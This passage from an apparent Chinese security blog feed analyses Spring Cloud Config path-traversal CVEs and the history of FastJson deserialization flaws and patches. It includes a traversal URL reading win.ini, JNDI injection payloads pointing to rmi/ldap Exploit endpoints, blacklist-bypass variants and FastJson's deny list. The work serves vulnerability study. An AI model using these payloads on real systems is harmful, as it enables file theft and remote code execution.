Config手册上的描述：</p><blockquote><p>配置服务器通过<code>/{name}/{profile}/{label}/{path}</code>中的附加端点提供这些服务，其中“name”，“profile”和“label”的含义与常规环境端点相同，但“path”是文件名（例如<code>log.xml</code> ）。</p></blockquote><p>首先服务器通过配置文件指定远程的github仓库，然后通过rest接口来读取仓库中的配置文件信息，如读取<code>logtest.yml</code>文件：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200505195343200.png" alt="image-20200505195343200"></p><p>name用来指定名称，profile指定当前策略，label来指定版本，因为<code>logtest.yml</code>文件并没有名称和策略信息，可随意指定：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200505195638748.png" alt="image-20200505195638748"></p><p>通过源码查看对于<code>/{name}/{profile}/{label}</code>请求的处理逻辑：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200505201049732.png" alt="image-20200505201049732"></p><p>获取的参数会传入<code>getFilePath</code>函数处理，跟进<code>getFIilePath</code>函数：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200506134110961.png" alt="image-20200506134110961"></p><p>经过<code>getFilePath</code>函数处理，最终获取所需要读取到文件名，接着进入<code>retrieve</code>函数，跟进<code>retrieve</code>函数：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200506134454301.png" alt="image-20200506134454301"></p><p>通过代码看出，通过函数<code>findOne</code>来获取最终读取的配置文件（logtest.yml），并返回<code>Resource</code>接口，跟进<code>findOne</code>函数：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200506140225030.png" alt="image-20200506140225030"></p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200506140326813.png" alt="image-20200506140326813"></p><p>文件名可控，因此直接构造<code>../</code>(注意编码)就可进行目录穿越造成任意文件读取。</p><h2 id="CVE-2019-3799-补丁"><a href="#CVE-2019-3799-补丁" class="headerlink" title="CVE-2019-3799-补丁"></a>CVE-2019-3799-补丁</h2><p>补丁地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/spring-cloud/spring-cloud-config/commit/3632fc6f64e567286c42c5a2f1b8142bfde505c2</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200507144109812.png" alt="image-20200507144109812"></p><p>在补丁中主要增加了<code>isInvalidPath</code>和<code>isInvalidEncodedPath</code>函数，增加了对路径的检测。</p><p><code>isInvalidPath</code>函数处理逻辑如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200507150732668.png" alt="image-20200507150732668"></p><p><code>isInvalidEncodedPath</code>函数处理逻辑如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200507151047117.png" alt="image-20200507151047117"></p><p>processPath函数代码如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200507152222567.png" alt="image-20200507152222567"></p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200507162530155.png" alt="image-20200507162530155"></p><h2 id="CVE-2020-5405"><a href="#CVE-2020-5405" class="headerlink" title="CVE-2020-5405"></a>CVE-2020-5405</h2><p>漏洞的利用有一定的局限性，需要修改配置文件，从本地获取配置文件，不适用于git的情况。</p><h3 id="漏洞公告-1"><a href="#漏洞公告-1" class="headerlink" title="漏洞公告"></a>漏洞公告</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://tanzu.vmware.com/security/cve-2020-5405</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200509180906145.png" alt="image-20200509180906145"></p><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这里分析的版本为：Spring Cloud Config 2.2.0</p><p>源码下载地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/spring-cloud/spring-cloud-config/releases/tag/v2.2.0.RELEASE</span><br></pre></td></tr></table></figure><p>下载好源码后需要修改<code>src\main\resources\configserver.yml</code>文件，将策略改为<code>nativa</code>，至于为什么修改，接下来将进行分析。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">native</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">config:</span></span><br><span class="line">      <span class="attr">server:</span></span><br><span class="line">        <span class="attr">native:</span></span><br><span class="line">          <span class="attr">search-locations:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">file:///F:/dir/config-repos/mrcode/dirr</span></span><br></pre></td></tr></table></figure><p>配置文档：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://zq99299.github.io/note-book/spring-cloud-tutorial/config/002.html#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%90%8E%E7%AB%AF</span><br></pre></td></tr></table></figure><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>任意文件读取漏洞，尝试读取<code>C:\Windows\win.ini</code>文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8888/a/b/..(_)..(_)..(_)..(_)..(_)..(_)Windows/win.ini</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200510163047464.png" alt="image-20200510163047464"></p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>CVE-2019-3799的补丁可有效阻止基于path的路径穿越攻击，通过本次的利用方式可以看出，漏洞的触发点并不在<code>path</code>处，而是在<code>label</code>处。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200510163920725.png" alt="image-20200510163920725"></p><p>通过源码看出，<code>label</code>参数经过了<code>resolveLabel</code>函数处理，跟进<code>resolveLabel</code>函数：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200510164043694.png" alt="image-20200510164043694"></p><p>可以看出，如果<code>label</code>参数中存在<code>(_)</code>，将会被替换为<code>/</code>，因<code>label</code>参数可控，只需要将<code>(_)</code>通过参数传入，经过代码处理后文件路径边可以控制。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200510164428812.png" alt="image-20200510164428812"></p><p>代码默认从git端读取信息，如果采用默认方式，当<code>label</code>指定版本的不存在时会报500错误，报错信息如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200510172457884.png" alt="image-20200510172457884"></p><p>通过报错信息可以知道，在经过<code>checkout</code>函数时存在了异常：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200510172840687.png" alt="image-20200510172840687"></p><p>当更改为本地获取配置信息时，如果读取的文件不带后缀，也会报500错误，因此通过<code>/etc/passwd</code>做漏洞检测时，虽然漏洞存在，但也会报错。</p><h2 id="CVE-2020-5405-补丁"><a href="#CVE-2020-5405-补丁" class="headerlink" title="CVE-2020-5405-补丁"></a>CVE-2020-5405-补丁</h2><p>补丁地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/spring-cloud/spring-cloud-config/commit/651f458919c40ef9a5e93e7d76bf98575910fad0</span><br></pre></td></tr></table></figure><p>新增了<code>isInvalidEncodedLocation</code>函数对<code>location</code>进行了检测，逻辑与对<code>path</code>检测的逻辑大致相同。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200510174009638.png" alt="image-20200510174009638"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/7558</span><br><span class="line">https://xz.aliyun.com/t/4844</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;spring cloud config是spring cloud团队创建的一个全新项目，用来为分布式系统中的基础设施和微服务应用提供集中化的外部配置支持。&lt;/p&gt;
    
    </summary>
    
    
      <category term="JavaSec" scheme="https://www.sys71m.top/categories/JavaSec/"/>
    
    
      <category term="Spring-Cloud-Config" scheme="https://www.sys71m.top/tags/Spring-Cloud-Config/"/>
    
      <category term="微服务" scheme="https://www.sys71m.top/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title>FastJson全历史反序列化漏洞分析(保持更新)</title>
    <link href="https://www.sys71m.top/2020/05/02/FastJson%E5%85%A8%E5%8E%86%E5%8F%B2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%BF%9D%E6%8C%81%E6%9B%B4%E6%96%B0)/"/>
    <id>https://www.sys71m.top/2020/05/02/FastJson%E5%85%A8%E5%8E%86%E5%8F%B2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%BF%9D%E6%8C%81%E6%9B%B4%E6%96%B0)/</id>
    <published>2020-05-02T08:53:08.000Z</published>
    <updated>2020-11-04T23:46:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>基于时间线的方式分析FastJson反序列化漏洞。</p><a id="more"></a>  <h2 id="FastJson反序列化漏洞时间线概览"><a href="#FastJson反序列化漏洞时间线概览" class="headerlink" title="FastJson反序列化漏洞时间线概览"></a>FastJson反序列化漏洞时间线概览</h2><ol><li>2017年3月15日   FastJson官方主动爆出在1.2.24及之前版本存在远程代码执行高危安全漏洞（当时最新版：1.2.28）</li><li>FastJson 1.2.25被绕过，影响版本1.2.25-1.2.41（当时最新版：1.2.41）</li><li>FastJson 1.2.42进行了安全加固</li><li>FastJson 1.2.42被绕过</li><li>FastJson 1.2.43进行了安全加固</li><li>FastJson 1.2.44进行了安全加固</li><li>FastJson 1.2.45扩大检测黑名单</li><li>FastJson 1.2.46扩大检测黑名单</li><li>FastJson 1.2.47全版本通杀漏洞出现！！！</li><li>FastJson 1.2.48进行了安全加固</li><li>未完待续。。。</li></ol><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p><p>创建一个名为Person的java类，重写<code>toString</code>方法，带有无参构造函数。并对当前Person类进行序列化和反序列化操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"public Person construction"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age, String sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"pulic String getName"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"public void setName"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"public int getAge"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"public void setAge"</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Person&#123;"</span> +</span><br><span class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", sex='"</span> + sex + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", age="</span> + age +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="string">"Lisa"</span>, <span class="number">22</span>, <span class="string">"女"</span>);</span><br><span class="line">        String jsonString = JSON.toJSONString(person);</span><br><span class="line">        String jsonString_type = JSON.toJSONString(person, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line">        System.out.println(jsonString_type);</span><br><span class="line">        Object newPerson = JSON.parse(jsonString_type);</span><br><span class="line">        System.out.println(newPerson);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/FastJson/image-20200420215724239.png" alt="image-20200420215724239"></p><p>通过输出结果可以了解，<code>FastJson</code>对java对象进行序列化时会调用<code>getter</code>方法，反序列化时调用无参构造方法以及<code>setter</code>方法，上面sex变量并没有<code>setter</code>方法，因此反序列化时无法进行赋值。</p><p>当在序列化时加入<code>SerializerFeature.WriteClassName</code>配置会将当前序列化的类写入json字符串中。<code>@type</code>属性可指定需要反序列化的类，调用其getter，setter，is方法。可以再新建一个和Person类相同属性和相同方法的PersonTest类，修改<code>@type</code>的属性，测试是否可以指定需要反序列化的类。正因为这个属性，使得用户可通过<code>@type</code>参数控制反序列化的类，造成RCE。</p><h2 id="时间线-1"><a href="#时间线-1" class="headerlink" title="时间线-1"></a>时间线-1</h2><p>具体参考：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/alibaba/fastjson/wiki/security_update_20170315</span><br><span class="line">https://github.com/alibaba/fastjson/wiki/security_update_20170315/3f4706e687876c6c55785d6f9bb362f4241f1929</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/FastJson/image-20200419232107916.png" alt="image-20200419232107916"></p><p>通过前置知识对<code>FastJson</code>序列化与反序列化的特点的分析，只需要找到危险的java类，在调用getter或者setter方法是执行恶意操作即可。</p><p>2017年4月29日基于<code>TemplatesImpl</code>类反序列化漏洞利用poc在网上流出（只能在1.2.22和1.2.24之间利用），该类的利用对版本的要求较大，具体可参考：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</span><br></pre></td></tr></table></figure><p>除此之外，<code>JdbcRowSetImpl</code>类也可执行RCE，查看该类的<code>setAutoCommit</code>方法：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/FastJson/image-20200428173716448.png" alt="image-20200428173716448"></p><p>先判断是否进行了数据库连接，如果没有则会进入<code>connect</code>函数进行连接，跟进一下<code>connect</code>函数：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/FastJson/image-20200428173943091.png" alt="image-20200428173943091"></p><p>此方法会对传入的<code>dataSource</code>进行<code>lookup</code>，由于反序列时<code>dataSource</code>变量可以控制，可利用<code>jndi</code>注入的方式进行利用。</p><p>payload：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit",""autoCommit":true&#125;</span><br></pre></td></tr></table></figure><p>测试环境可参考<code>vulhub</code>上的靶机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.24-rce</span><br></pre></td></tr></table></figure><h2 id="时间线-2"><a href="#时间线-2" class="headerlink" title="时间线-2"></a>时间线-2</h2><blockquote><p>注意：在1.2.25之后的版本，以及所有的.sec01后缀版本中，默认启用白名单的方式。下面提到的利用方式大部分针对黑名单开启的情况。</p></blockquote><p>根据官方给出的补丁文件，主要的更新在这个checkAutoType函数上，而这个函数的主要功能就是添加了黑名单，将一些常用的反序列化利用库都添加到黑名单中，黑名单如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String[] denyList = <span class="string">"bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework"</span>.split(<span class="string">","</span>);</span><br></pre></td></tr></table></figure><p>checkAutoType部分函数如下（针对黑名单开启情况，autoTypeSupport=true）：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/FastJson/image-20200501182851992.png" alt="image-20200501182851992"></p><p>首先程序会去检测白名单，typeName在白名单中则直接加载，然后去做黑名单检测，在黑名单中则抛出异常。当typeName不在白名单并且黑名单为检测出异常时，程序会尝试加载此类：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/FastJson/image-20200501183229084.png" alt="image-20200501183229084"></p><p>跟进loadClass函数</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/FastJson/image-20200501183355980.png" alt="image-20200501183355980"></p><p>发现如果typeName开头为<code>L</code>结尾为<code>;</code>会自动递归去除开头和结尾，因此利用此方法可绕过大部分黑名单的限制。</p><p>payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"Lcom.sun.rowset.RowSetImpl;"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"rmi://localhost:1099/Exploit"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="时间线-3"><a href="#时间线-3" class="headerlink" title="时间线-3"></a>时间线-3</h2><p>对1.2.42和1.2.41进行比较，主要进行了以下更新，之前的黑名单和白名单改为hash模式，增大了分析的难度，但仍可通过枚举爆破的方式获取，网上已有人做出了爆破，参考：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/LeadroyaL/fastjson-blacklist</span><br></pre></td></tr></table></figure><p>对比如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/FastJson/image-20200501185914604.png" alt="image-20200501185914604"></p><p>接着对传入的typeName进行了逻辑上的修改，主要如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/FastJson/image-20200501191228107.png" alt="image-20200501191228107"></p><p>提取className的第一个字符和最后一个字符，是否为<code>L</code>开头和<code>;</code>结尾，如果hash匹配相同则进行去除，然后再进行黑名单的判断。</p><h2 id="时间线-4"><a href="#时间线-4" class="headerlink" title="时间线-4"></a>时间线-4</h2><p>根据上面的对比，代码只进行了一次检验，因此双写绕过第一次的检测，然后绕过黑名单检测，进而进入loadClass，防护也就没有了效果。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.RowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><h2 id="时间线-5"><a href="#时间线-5" class="headerlink" title="时间线-5"></a>时间线-5</h2><p>1.2.43的主要更新如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/FastJson/image-20200501192527205.png" alt="image-20200501192527205"></p><p>如果className的开头为<code>LL</code>则直接发出异常。安全加固有效，可有效组织反序列化的攻击。</p><h2 id="时间线-6"><a href="#时间线-6" class="headerlink" title="时间线-6"></a>时间线-6</h2><p>1.2.44的主要更新如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/FastJson/image-20200501224103898.png" alt="image-20200501224103898"></p><p>将之前的判断逻辑进行了修改，如果className开头为<code>L</code>或者<code>[</code>则抛出异常，增加对<code>[</code>开头的检测是因为进行类加载时也会对<code>[</code>进行判断，存在则删除：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">'['</span>) &#123;</span><br><span class="line">    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">    <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际操作中，带有<code>[</code>开头的类型是无法被java程序正常执行的，但仍然对其进行了限制。。</p><h2 id="时间线-7"><a href="#时间线-7" class="headerlink" title="时间线-7"></a>时间线-7</h2><p>1.2.45没有什么太大的安全更新，只是对之前的黑名单进行了拓展。</p><h2 id="时间线-8"><a href="#时间线-8" class="headerlink" title="时间线-8"></a>时间线-8</h2><p>1.2.46没有什么太大的安全更新，只是对之前的黑名单进行了拓展。</p><h2 id="时间线-9"><a href="#时间线-9" class="headerlink" title="时间线-9"></a>时间线-9</h2><p>1.2.47版本，出现了最为严重的漏洞，前面分析的漏洞都是基于黑名单检测开启的情况，但大部分一般采用默认配置并不开启type解析，导致影响范围较为局限，在1.2.47版本爆出的漏洞，可以通杀1.2.47及之前所有版本，无论是否开启黑名单检测。</p><p>payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"a"</span>:&#123;<span class="string">"@type"</span>:<span class="string">"java.lang.Class"</span>,<span class="string">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>&#125;,<span class="string">"b"</span>:&#123;<span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:9999/Exploit"</span>,<span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>主要问题还是出现在<code>checkAutoType</code>函数中，这里对1.2.47版本进行分析，函数如下，关键代码进行了注释：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span 